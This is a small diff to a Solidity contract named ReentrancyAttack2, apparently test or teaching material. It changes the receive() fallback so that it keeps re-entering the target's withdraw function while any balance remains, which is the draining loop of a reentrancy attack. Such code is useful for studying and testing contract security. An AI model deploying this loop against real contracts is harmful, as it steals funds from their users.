@@ -74,7 +74,7 @@ contract ReentrancyAttack2 {
     }
 
     receive() external payable {
-        if (address(reentrancy).balance >= attackAmount) {
+        if (address(reentrancy).balance > 0) {
             reentrancy.withdraw(attackAmount);
         }
     }
